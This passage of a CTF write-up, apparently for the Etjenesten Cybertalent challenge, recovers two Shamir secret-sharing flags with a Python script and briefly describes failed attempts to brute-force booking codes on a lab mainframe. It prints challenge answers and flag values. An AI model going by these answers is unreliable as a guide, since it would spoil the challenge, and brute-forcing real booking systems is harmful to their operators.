Svar:     2692ac1fb3e881ab73240db60dd03ae7

Gratulerer, korrekt svar!
```



# [9. Gammelt](./9_gammelt)

Having completed last years CTF, solving it again was fairly easy. See the following writeups: [Sithis](https://github.com/williamsolem/Etjenesten-Cybertalent-CTF-Writeup), [Agent Random](https://blog.agentrandom.com/cybertalent-ctf/), [zig](https://www.indregard.no/2020/03/e-tjenestens-ctf/), [UnblvR](https://github.com/myrdyr/ctf-writeups/tree/master/etjenesten20), or [SgtSIGSEGV](https://blog.mrfjo.org/2020/03/02/NIS-Cybertalent).

```
login@corax:~$ scoreboard --secret-shares
Dine andeler:

3.1. Utfordringer lett
3.1.1_clmystery           f4(1)=103897326758549940055925588924916   f9(1)=78416662352898028738456380336979

9. Gammelt
9.1.1_keystore            f4(2)=10340134542888813646404431216601    f9(2)=54512220361155434109080573852585
9.1.2_lootd               f4(3)=123697489095005887704911474000161   f9(3)=105595548362576193712398929798566
9.1.3_loot_home           f4(4)=117384148289252695240809037788732   f9(4)=22896490884629287279847925445605
9.1.4_loot_vault          f4(5)=151592700487620859438193473959831   f9(5)=84422722942423784717598068928766
9.1.5_headquarters        f4(6)=61997180393675276698005113314721    f9(6)=81404089063428665757085837518732
9.1.6_decryption          f4(7)=8790176369407570204340307230919     f9(7)=129588987433539636912903729062440
9.2.2_knock-knock         f4(8)=152164276776809363141295407085942   f9(8)=20207262580225677916488220830573
9.2.3_runer               f4(9)=3274962661018825126654723104799     f9(9)=31266589518595858674009820958195
9.2.4_sharing_secrets_k=3 f4(10)=46833376042454306127670627241261    f9(10)=116256089605332522308483017004116
9.3.1_artwork_del_2       f4(11)=118513551624680702545283450296591   f9(11)=66405607367904648551344286239019
9.3.2_explosion_6         f4(12)=53989524111262910780433523072052    f9(12)=159722817821421307308764136797968
```

```python
from shamir import recover_secret

# 11 Mersenne-primtallet
# p = 107
PRIME = (2 ** 107) - 1

k4_shares = [
    (1, 103897326758549940055925588924916),
    (2, 10340134542888813646404431216601),
    (3, 123697489095005887704911474000161),
    (4, 117384148289252695240809037788732),
    (5, 151592700487620859438193473959831),
    (6, 61997180393675276698005113314721),
    (7, 8790176369407570204340307230919),
    (8, 152164276776809363141295407085942),
    (9, 3274962661018825126654723104799),
    (10, 46833376042454306127670627241261),
    (11, 118513551624680702545283450296591),
    (12, 53989524111262910780433523072052),
]

k9_shares = [
    (1, 78416662352898028738456380336979),
    (2, 54512220361155434109080573852585),
    (3, 105595548362576193712398929798566),
    (4, 22896490884629287279847925445605),
    (5, 84422722942423784717598068928766),
    (6, 81404089063428665757085837518732),
    (7, 129588987433539636912903729062440),
    (8, 20207262580225677916488220830573),
    (9, 31266589518595858674009820958195),
    (10, 116256089605332522308483017004116),
    (11, 66405607367904648551344286239019),
    (12, 159722817821421307308764136797968),
]

k4 = recover_secret(k4_shares, PRIME)
print("k=4:", k4)
k9 = recover_secret(k9_shares, PRIME)
print("k=9:", k9)
```


```shell
$ python3 solve.py
k=4: 81917200550784280357800585459462
k=9: 61560476151908271085933851404811
```
```shell
login@corax:~$ scoreboard 81917200550784280357800585459462
Kategori: 9. Gammelt
Oppgave:  9.2.4_sharing_secrets_k=4
Svar:     81917200550784280357800585459462

Gratulerer, korrekt svar!
```
```shell
login@corax:~$ scoreboard 61560476151908271085933851404811
Kategori: 9. Gammelt
Oppgave:  9.2.4_sharing_secrets_k=9
Svar:     61560476151908271085933851404811

Gratulerer, korrekt svar!
```

# [9000. Madness](./9000_madness)

## [2_seatheworld_bookings_bruteforcer](./9000_madness/2_seatheworld_bookings_bruteforcer)

After attempting to find the booking reference codes / names on the system without luck, we attempt to bruteforce the reference codes for fun (without luck of course) with [py3270](https://pypi.org/project/py3270/).

![ec55a1a099714a3d82164be6cb3cfc3d.gif](./9000_madness/2_seatheworld_bookings_bruteforcer/screenshots/ec55a1a099714a3d82164be6cb3cfc3d.gif)

## [2_seatheworld_bookings_parser](./9000_madness/2_seatheworld_bookings_parser)

In another desperate attempt, we try to map the amount of bookings per date over time to see if there is any pattern that we can use, without luck here as well.

![7430b4b8e93b4bc2a9d68cea3ba1eb6e.png](./9000_madness/2_seatheworld_bookings_parser/screenshots/7430b4b8e93b4bc2a9d68cea3ba1eb6e.png)

## [2_seatheworld_data_set_downloader](./9000_madness/2_seatheworld_data_set_downloader)

Script to download data sets from the IBM mainframe.
